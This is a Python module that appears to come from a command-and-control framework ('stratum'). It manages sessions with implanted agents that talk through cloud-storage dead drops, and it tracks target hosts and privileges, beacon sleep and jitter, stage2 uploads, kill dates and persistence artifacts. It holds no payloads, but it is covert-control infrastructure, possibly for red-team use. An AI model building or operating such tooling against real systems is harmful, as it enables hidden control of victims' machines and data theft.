# providers/_session.py
# Transport layer, session profile, agent state, session history, persist helpers,
# Session, and SessionManager.

import copy
import csv
import json
import re
import threading
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

def _tz_now():
    import core.tz as _core_tz
    return _core_tz.now()

# Provide _tz object-like interface for call sites using _tz.now()
class _TzProxy:
    def now(self):
        return _tz_now()
    def isoformat(self, *a, **kw):
        return _tz_now().isoformat(*a, **kw)

_tz = _TzProxy()


from providers._notifications import (
    _n_ok, _n_err, _n_warn, _n_info,
    _n_output, _n_ul_confirmed, _n_heartbeat, _n_agent_dead,
    _n_save_session, _n_persist_updated, _save_ul_record,
)

# ── constants ─────────────────────────────────────────────────────────────────
MZ_MARKER           = "MZ"
HB_REFRESH_INTERVAL = 15          # heartbeat monitor polling cadence (seconds)
DOWNLOADS_DIR       = Path("./downloads")
_TEMPLATES_DIR      = Path(__file__).parent.parent / "agents" / "templates"


# ══════════════════════════════════════════════════════════════════════════════
#  TRANSPORT LAYER
# ══════════════════════════════════════════════════════════════════════════════

class RateLimitedError(Exception):
    """Raised by transport.download() when the cloud provider returns HTTP 429.

    Caught by HeartbeatMonitor._tick() to skip the poll cycle without marking
    the agent offline — a 429 means the server is reachable, not the agent dead.
    """


class BaseTransport(ABC):
    """Minimal interface each cloud provider transport must implement."""

    @abstractmethod
    def upload(self, path: str, data: bytes) -> bool: ...

    @abstractmethod
    def download(self, path: str) -> Optional[bytes]: ...

    @abstractmethod
    def delete(self, path: str) -> bool: ...

    def delete_folder(self, folder_path: str) -> bool:
        """Delete a cloud folder and all its contents recursively.

        Default implementation calls delete(folder_path) — works for providers
        whose API treats folder deletion as recursive (Dropbox, OneDrive, SharePoint).
        Override for providers that require listing before deletion (Google Drive, S3).
        """
        return self.delete(folder_path)


# Registry populated by each provider's wizard module at import time.
# e.g. providers/dropbox/wizard.py does: TRANSPORT_REGISTRY["dropbox"] = DropboxTransport
TRANSPORT_REGISTRY: dict[str, type[BaseTransport]] = {}


def _load_creds_file(path: Path) -> dict:
    if not path.exists():
        raise FileNotFoundError(f"Credentials file not found: {path}")
    creds: dict = {}
    for line in path.read_text().splitlines():
        m = re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
        if m:
            creds[m.group(1)] = m.group(2).strip()
    return creds


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION PROFILE  (persisted as sessions/<id>.json)
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class SessionProfile:
    session_id:       str
    provider:         str
    creds_file:       str   # path relative to project root
    private_key_file: str   # path relative to project root
    folder_path:      str
    input_file:       str
    output_file:      str
    heartbeat_file:   str
    base_sleep:       int
    jitter_percent:   int
    deploy_mode:      str
    label:            str = ""
    blob_path:        str = ""   # Linux blob path
    blob_path_win:    str = ""   # Windows blob path
    ip_ext:           str = ""
    added_at:         str = ""
    s2_deleted:       bool = False  # True once the stage2 cloud artifact has been cancelled
    s2_path_cloud:    str = ""   # actual cloud path of the stage2 file (derived at deploy time)
    s2_uploaded_at:   str = ""   # ISO timestamp when stage2 was uploaded; "" if not applicable
    sk_deleted:       bool = False  # True once the *.sk cloud artifact has been cleaned up
    session_key:      str = ""   # hex-encoded 32-byte pre-shared key; wraps aes_key server→agent
    prekey_privs_hex: str = ""   # hex X25519 private keys (prekey pool, server keeps all)
    prekey_pubs_hex:  str = ""   # hex X25519 public keys (prekey pool, baked into agent)
    epoch_state_json: str = ""   # JSON-serialized EpochState (updated on every epoch change)
    fs_enabled:       bool = True
    kill_date:        str = ""   # "YYYY-MM-DD" or "" — baked at deploy time
    window_start:     str = ""   # "HH:MM" or ""
    window_end:       str = ""   # "HH:MM" or ""
    stratum_version:  str = ""   # server version at deploy time
    locked:           bool = False  # operator lock — prevents kill/stop/delete/wipe

    @property
    def input_path(self)     -> str: return self.folder_path + self.input_file
    @property
    def output_path(self)    -> str: return self.folder_path + self.output_file
    @property
    def heartbeat_path(self) -> str: return self.folder_path + self.heartbeat_file
    @property
    def staging_path(self)   -> str: return self.folder_path + "/staging"

    @classmethod
    def from_file(cls, path: Path) -> "SessionProfile":
        data  = json.loads(path.read_text())
        known = {f for f in cls.__dataclass_fields__}
        return cls(**{k: v for k, v in data.items() if k in known})

    def to_dict(self) -> dict:
        return {f: getattr(self, f) for f in self.__dataclass_fields__}


# ══════════════════════════════════════════════════════════════════════════════
#  AGENT STATE  (thread-safe per-session target info)
# ══════════════════════════════════════════════════════════════════════════════

class AgentState:
    def __init__(self):
        self._lock             = threading.Lock()
        self.target_user:  str = ""
        self.target_host:  str = ""
        self.target_os:    str = ""
        self.target_ip:    str = ""
        self.target_ip_ext: str = ""
        self.target_privs: str = ""
        self.target_domain: str = ""
        self.target_blob:   str = ""
        self.agent_start_cwd: str = ""
        self.remote_cwd:   str = ""
        self.agent_pid:    str = ""
        self.agent_process: str = ""
        self.state:        str = "unknown"
        self.key_mismatch: bool = False
        self.last_hb_ts:   str = ""
        self.last_seen_at: Optional[float] = None
        self.last_hb_seq:  int = -1
        self.persist_probe_data: dict = {}
        self.listeners: dict = {}  # key → {proto, port, started_at, creds: [...] }

    def update(self, **kw):
        with self._lock:
            for k, v in kw.items():
                if hasattr(self, k):
                    setattr(self, k, v)

    def snapshot(self) -> dict:
        with self._lock:
            return {k: copy.deepcopy(v) for k, v in self.__dict__.items() if not k.startswith("_")}


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION HISTORY
# ══════════════════════════════════════════════════════════════════════════════

class SessionHistory:
    """
    One CSV file per session_id, located in <project_dir>/logs/.
    The file is created on first write and appended on subsequent runs —
    no timestamp in the filename so N hosts never produce overlapping files.
    """

    HEADER = ["timestamp", "session_id", "id", "command", "response", "operator"]

    def __init__(self, session_id: str, log_dir: Path, provider: str = "", folder: str = ""):
        self.session_id = session_id
        self.entries:   list = []
        self._log_dir   = log_dir
        self._csv_path: Optional[Path] = None
        folder_slug = folder.strip("/").replace("/", "_") or "default"
        self._filename = f"{provider}_{folder_slug}_{session_id}.csv" if provider else f"stratum_{session_id}.csv"

    def _ensure_csv(self):
        if self._csv_path is not None:
            return
        self._log_dir.mkdir(parents=True, exist_ok=True)
        path      = self._log_dir / self._filename
        is_new    = not path.exists() or path.stat().st_size == 0
        self._csv_path = path
        with open(path, "a", newline="") as f:
            w = csv.writer(f)
            if is_new:
                w.writerow(self.HEADER)
            else:
                # Separator so different operator runs are distinguishable in the file
                w.writerow([f"--- resumed {_tz.now().isoformat(timespec='seconds')} ---",
                             self.session_id, "", "", ""])

    def add(self, cmd: str, cmd_id: str = "", operator: str = ""):
        ts = _tz.now()
        self.entries.append([ts, cmd_id, cmd, "", operator])
        self._ensure_csv()
        with open(self._csv_path, "a", newline="") as f:
            csv.writer(f).writerow([ts.isoformat(), self.session_id, cmd_id, cmd, "", operator])

    def update_response(self, resp: str):
        if self.entries:
            self.entries[-1][3] = resp
            self._ensure_csv()
            with open(self._csv_path, "a", newline="") as f:
                ts, cid, cmd, _, operator = self.entries[-1]
                csv.writer(f).writerow([ts.isoformat(), self.session_id, cid, cmd, resp, operator])

    def log_download(self, cmd_id: str, remote_label: str, local_path: str, size: int):
        self._ensure_csv()
        resp = f"saved: {local_path}  ({size:,} bytes)"
        with open(self._csv_path, "a", newline="") as f:
            csv.writer(f).writerow([
                _tz.now().isoformat(), self.session_id, cmd_id,
                f"/download {remote_label}", resp, "",
            ])

    def record_artifact(self, kind: str, path: str):
        """Append an ARTIFACT row to the CSV (files written on target)."""
        self._ensure_csv()
        with open(self._csv_path, "a", newline="") as f:
            csv.writer(f).writerow([
                _tz.now().isoformat(), self.session_id, "ARTIFACT", f"{kind}:{path}", "",
            ])

    def remove_artifact(self, kind: str, path: str):
        """Append an ARTIFACT_REMOVED row (PERSIST:remove / cleanup)."""
        self._ensure_csv()
        with open(self._csv_path, "a", newline="") as f:
            csv.writer(f).writerow([
                _tz.now().isoformat(), self.session_id, "ARTIFACT_REMOVED", f"{kind}:{path}", "",
            ])

    def artifacts(self) -> list[dict]:
        """Replay CSV to return current artifact set (adds minus removes)."""
        path = self._csv_path
        if path is None:
            p = self._log_dir / self._filename
            if not p.exists():
                return []
            path = p
        result: dict = {}
        try:
            with open(path, newline="") as f:
                for row in csv.reader(f):
                    if len(row) < 4:
                        continue
                    ts, _sid, entry_id, command = row[0], row[1], row[2], row[3]
                    if entry_id == "ARTIFACT":
                        kind, _, art_path = command.partition(":")
                        if kind and art_path:
                            result[(kind, art_path)] = {"type": kind, "path": art_path, "recorded_at": ts}
                    elif entry_id == "ARTIFACT_REMOVED":
                        kind, _, art_path = command.partition(":")
                        result.pop((kind, art_path), None)
        except Exception:
            pass
        return list(result.values())


def _sync_persist_check(sess: "Session", output: str) -> None:
    """Update the artifact registry from a PERSIST:check response."""
    import re as _rpc
    if "ACTIVE" in output:
        m = _rpc.search(r'Payload:\s+(\S+)', output)
        if m:
            path = m.group(1)
            if any(path.endswith(ext) for ext in ('.ps1', '.exe', '.dll')):
                sess.hist.record_artifact('persist_stub', path)
            else:
                sess.hist.record_artifact('persist_payload', path)
                sess.hist.record_artifact('persist_cron', f"@reboot {path}")
        tm = _rpc.search(r'Task:\s+(\S+)\s*\(registered\)', output)
        if tm:
            sess.hist.record_artifact('persist_task', tm.group(1))
    elif "NOT installed" in output:
        for a in sess.hist.artifacts():
            if a['type'].startswith('persist_'):
                sess.hist.remove_artifact(a['type'], a['path'])


def _probe_json_path(sess: "Session") -> "Path":
    return sess.hist._log_dir / f"probe_{sess.id}.json"


def _infer_persist_status(op: str, output: str) -> Optional[str]:
    """Return normalised status string from install/remove/status response, or None."""
    t = (output or "").strip()
    if op == "status":
        if t.startswith("ACTIVE:"):    return "installed"
        if t.startswith("PARTIAL:"):   return "partial"
        if t.startswith("NOT INSTALLED:"): return "available"
    elif op == "install":
        if re.search(r'^OK:.*install', t, re.I) or re.search(r'^OK:.*already', t, re.I):
            return "installed"
    elif op == "remove":
        if re.search(r'^OK:.*remov', t, re.I):
            return "available"
    return None


def _sync_persist_op(sess: "Session", op: str, technique: str, output: str) -> None:
    """Update persist_probe_data for a single technique after install/remove/status."""
    new_status = _infer_persist_status(op, output)
    if new_status is None:
        return
    p = _probe_json_path(sess)
    try:
        existing = json.loads(p.read_text()) if p.exists() else {}
    except Exception:
        existing = {}
    if technique not in existing:
        existing[technique] = {}
    existing[technique]["status"] = new_status
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(existing, indent=2))
    except Exception:
        pass
    sess.state.update(persist_probe_data=existing)
    _n_persist_updated(sess.id)


def _sync_persist_probe(sess: "Session", output: str) -> None:
    """Parse PERSIST_PROBE output, persist to disk, and update live session state."""
    probe_data = {}
    for line in output.splitlines():
        if line.startswith("PROBE:"):
            parts = line[6:].split(":", 3)
            if len(parts) >= 4:
                technique, status, scope, detail = parts[0], parts[1], parts[2], parts[3]
                probe_data[technique] = {
                    "status": status,
                    "scope": scope,
                    "detail": detail,
                    "probed_at": datetime.now(timezone.utc).isoformat(),
                }
    if not probe_data:
        return
    # Merge with any existing data on disk (last probe per technique wins)
    p = _probe_json_path(sess)
    try:
        existing = json.loads(p.read_text()) if p.exists() else {}
    except Exception:
        existing = {}
    existing.update(probe_data)
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(existing, indent=2))
    except Exception:
        pass
    sess.state.update(persist_probe_data=existing)
    _n_persist_updated(sess.id)


def _load_persist_probe(sess: "Session") -> None:
    """Load persisted probe data from disk into session state (called at session init)."""
    p = _probe_json_path(sess)
    if not p.exists():
        return
    try:
        data = json.loads(p.read_text())
        if data:
            sess.state.update(persist_probe_data=data)
    except Exception:
        pass


def _restore_state(sess: "Session", profile_path: "Path") -> None:
    """Restore AgentState from the _state blob saved in the session JSON file."""
    try:
        data = json.loads(profile_path.read_text())
        saved = data.get("_state")
        if saved and isinstance(saved, dict):
            # Exclude persist_probe_data — loaded separately by _load_persist_probe
            saved.pop("persist_probe_data", None)
            sess.state.update(**{k: v for k, v in saved.items()
                                 if hasattr(sess.state, k) and not k.startswith("_")})
    except Exception:
        pass


def _restore_pending_cmd(profile_path: "Path") -> Optional[dict]:
    """Return the raw _pending_cmd dict from the session JSON, or None if absent/invalid."""
    try:
        data = json.loads(profile_path.read_text())
        p = data.get("_pending_cmd")
        if isinstance(p, dict) and p.get("cmd_id") and p.get("expires_at"):
            return p
    except Exception:
        pass
    return None


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION  (one agent ↔ one dead-drop channel)
# ══════════════════════════════════════════════════════════════════════════════

class Session:
    """Encapsulates all state for a single agent session."""

    def __init__(self, profile: SessionProfile, transport: BaseTransport,
                 project_dir: Path = Path("."),
                 key_password: Optional[bytes] = None):
        self.profile      = profile
        self.transport    = transport
        self.project_dir  = project_dir
        self.key_password = key_password   # passphrase for encrypted private_key.pem (None = unencrypted)
        self.state        = AgentState()
        self.hist         = SessionHistory(profile.session_id, project_dir / "logs",
                                           provider=profile.provider, folder=profile.folder_path)

        # mutable timing (overridable via /sleep /jitter /timeout)
        self.agent_sleep:   int           = profile.base_sleep
        self.agent_jitter:  int           = profile.jitter_percent
        self._poll_timeout: Optional[int] = None
        self._pending_sleep:  Optional[int] = None  # awaiting agent confirmation
        self._pending_jitter: Optional[int] = None  # awaiting agent confirmation
        self._pending_sleep_cmd:  Optional[str] = None  # cmd_id that will confirm sleep
        self._pending_jitter_cmd: Optional[str] = None  # cmd_id that will confirm jitter

        # LOW-6: heartbeat timeout multipliers (configurable via server.yml)
        self.hb_warn_multiplier: int = 3
        self.hb_dead_multiplier: int = 6

        # poller bookkeeping
        self.baseline:        str  = MZ_MARKER
        self.last_tick:       float = 0.0
        self.pending_dl:      dict  = {}          # cmd_id → (filename, local_dest)
        self.pending_ul:      dict  = {}          # cmd_id → {filename, remote_path, size, timestamp}
        self.poller:          Optional["AsyncPoller"] = None
        self.poller_lock      = threading.Lock()
        self._hb:             Optional["HeartbeatMonitor"] = None
        self.polling_stopped: bool = False
        self._suppress_first_announce: bool = False
        self._next_hb_at:    Optional[float] = None   # agent-provided hint (Phase 2 adaptive polling)

    # ── derived ────────────────────────────────────────────────────────────────
    @property
    def id(self) -> str:
        return self.profile.session_id

    @property
    def poll_interval(self) -> int:
        return max(5, self.agent_sleep * (100 - self.agent_jitter) // 100)

    @property
    def poll_timeout(self) -> int:
        if self._poll_timeout is not None:
            return self._poll_timeout
        return max(self.agent_sleep * 3, 60)

    @poll_timeout.setter
    def poll_timeout(self, value: int) -> None:
        self._poll_timeout = value

    @property
    def private_key_file(self) -> str:
        return str(self.project_dir / self.profile.private_key_file)

    @property
    def session_key_hex(self) -> str:
        return self.profile.session_key

    @property
    def display_name(self) -> str:
        s = self.state.snapshot()
        if s["target_host"]:
            return f"{s['target_user']}@{s['target_host']}"
        return self.profile.label or self.id

    # ── epoch (forward secrecy) ──────────────────────────────────────────────

    def get_epoch_state(self):
        if not self.profile.epoch_state_json:
            return None
        try:
            from providers._epoch import epoch_state_from_dict
            return epoch_state_from_dict(json.loads(self.profile.epoch_state_json))
        except Exception:
            return None

    def save_epoch_state(self, epoch_state):
        from providers._epoch import epoch_state_to_dict
        self.profile.epoch_state_json = json.dumps(epoch_state_to_dict(epoch_state))

    def derive_agent_id(self) -> bytes:
        import hashlib as _hl
        h = _hl.sha256()
        h.update(b"stratum-agent-id:")
        h.update(bytes.fromhex(self.profile.session_key))
        return h.digest()

    # ── lifecycle ──────────────────────────────────────────────────────────────
    def start(self, run_hb_thread: bool = True):
        # Initial state sync — wrapped so any transient network/crypto failure
        # never prevents the session from registering and the HB monitor from
        # starting.  A session that has never had a heartbeat will simply appear
        # as "unknown/offline" until the agent first checks in.
        from providers._monitor import HeartbeatMonitor, _initial_hb_check
        try:
            if not Path(self.private_key_file).exists():
                _n_err(f"[{self.id}] private key not found: {self.private_key_file}")
            else:
                raw = self.transport.download(self.profile.output_path)
                self.baseline = raw.decode("utf-8", errors="replace").strip() if raw else MZ_MARKER
                _initial_hb_check(self)
                if self.profile.ip_ext and not self.state.snapshot().get("ip_ext_initial"):
                    self.state.update(ip_ext_initial=self.profile.ip_ext)
        except Exception as exc:
            _n_warn(f"[{self.id}] startup sync failed ({exc}) — HB monitor will reconcile state")
            self.baseline = MZ_MARKER
        self._hb = HeartbeatMonitor(self)
        if run_hb_thread:
            self._hb.start()

    def stop(self):
        if self._hb:
            self._hb.stop()
        with self.poller_lock:
            if self.poller:
                self.poller.stop()

    def stop_and_wait(self, timeout: float = 5.0):
        """Stop the poller and block until its thread finishes, then stop hb."""
        with self.poller_lock:
            poller = self.poller
        if poller:
            poller.stop()
            poller.done.wait(timeout=timeout)
        if self._hb:
            self._hb.stop()


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION MANAGER  (registry + persistence)
# ══════════════════════════════════════════════════════════════════════════════

def _session_json_name(profile: "SessionProfile") -> str:
    folder = profile.folder_path.strip("/").replace("/", "_") or "default"
    return f"{profile.provider}_{folder}_{profile.session_id}.json"


class SessionManager:
    def __init__(self, sessions_dir: Path = Path("sessions"),
                 project_dir: Path = Path("."),
                 key_password: Optional[bytes] = None):
        self._sessions:    dict[str, Session] = {}
        self.sessions_dir  = sessions_dir
        self.project_dir   = project_dir.resolve()
        self._lock         = threading.Lock()
        self._key_password = key_password

    def load_all(self, run_hb_thread: bool = True):
        from providers._monitor import _initial_hb_check
        self.sessions_dir.mkdir(exist_ok=True)
        for f in sorted(f for f in self.sessions_dir.glob("*.json") if not f.name.startswith("_")):
            try:
                profile   = SessionProfile.from_file(f)
                creds     = _load_creds_file(self.project_dir / profile.creds_file)
                cls       = TRANSPORT_REGISTRY.get(profile.provider)
                if cls is None:
                    _n_err(f"Unknown provider '{profile.provider}' in {f.name} — skip")
                    continue
                transport = cls(creds)
                s = Session(profile, transport, self.project_dir, self._key_password)
                _restore_state(s, f)
                _load_persist_probe(s)
                try:
                    s.start(run_hb_thread=run_hb_thread)
                except Exception as exc:
                    _n_warn(f"[{s.id}] start() raised unexpectedly ({exc}) — session still registered")
                with self._lock:
                    self._sessions[s.id] = s
            except FileNotFoundError as e:
                # Deployment directory was already wiped (delete_all). The session
                # JSON is stale — clean it up silently, not a corruption.
                try:
                    f.unlink()
                    _n_warn(f"Skipped {f.name}: deployment removed — cleaned up stale session JSON")
                except Exception:
                    _n_warn(f"Skipped {f.name}: deployment removed ({e})")
            except Exception as e:
                bad = f.with_suffix(".corrupt")
                try:
                    f.rename(bad)
                    _n_err(f"Failed to load {f.name}: {e} — renamed to {bad.name}")
                except Exception:
                    _n_err(f"Failed to load {f.name}: {e} — could not rename")

        # Restore polling-stopped flags
        try:
            poll_state = json.loads(self._poll_state_path().read_text())
            with self._lock:
                for sid, stopped in poll_state.items():
                    if stopped and sid in self._sessions:
                        self._sessions[sid].polling_stopped = True
        except Exception:
            pass

    def add(self, session: Session):
        """Register an already-started session (called after wizard.run())."""
        self.sessions_dir.mkdir(exist_ok=True)
        self._write_session_file(session)
        with self._lock:
            self._sessions[session.id] = session

    def _write_session_file(self, session: Session,
                            pending_cmd: Optional[dict] = None):
        """Persist profile + current AgentState (+ optional pending command) to disk."""
        self.sessions_dir.mkdir(exist_ok=True)
        profile_path = self.sessions_dir / _session_json_name(session.profile)
        data = session.profile.to_dict()
        data["_state"] = session.state.snapshot()
        if pending_cmd is not None:
            data["_pending_cmd"] = pending_cmd
        else:
            data.pop("_pending_cmd", None)
        # Use a unique temp filename to avoid race between poller and command threads.
        import os as _os
        import threading as _th
        tmp_path = profile_path.with_suffix(f".tmp.{_os.getpid()}.{_th.get_ident()}")
        try:
            tmp_path.write_text(json.dumps(data, indent=2))
            tmp_path.chmod(0o600)
            tmp_path.replace(profile_path)
        except FileNotFoundError:
            pass  # Another thread won the race — state is already persisted

    def remove(self, session_id: str) -> bool:
        with self._lock:
            s = self._sessions.pop(session_id, None)
        if s is None:
            return False
        # Wait for the poller thread to finish its current cycle before deleting
        # the JSON — prevents the race where the thread writes the file after unlink().
        s.stop_and_wait()
        for p in self.sessions_dir.glob("*.json"):
            if p.stem.endswith(f"_{session_id}") or p.stem == session_id:
                try:
                    p.unlink()
                except FileNotFoundError:
                    pass
                break
        return True

    def get(self, session_id: str) -> Optional[Session]:
        with self._lock:
            return self._sessions.get(session_id)

    def all(self) -> list[Session]:
        with self._lock:
            return list(self._sessions.values())

    def stop_all(self):
        for s in self.all():
            s.stop()

    def _poll_state_path(self) -> Path:
        return self.sessions_dir / "_poll_state.json"

    def _save_poll_state(self):
        stopped = {sid: True for sid, s in self._sessions.items() if s.polling_stopped}
        try:
            self._poll_state_path().write_text(json.dumps(stopped, indent=2))
        except Exception:
            pass

    def stop_polling(self, session_id: str) -> bool:
        with self._lock:
            s = self._sessions.get(session_id)
            if not s:
                return False
            s.polling_stopped = True
            self._save_poll_state()
            return True

    def resume_polling(self, session_id: str) -> bool:
        with self._lock:
            s = self._sessions.get(session_id)
            if not s:
                return False
            s.polling_stopped = False
            self._save_poll_state()
            return True
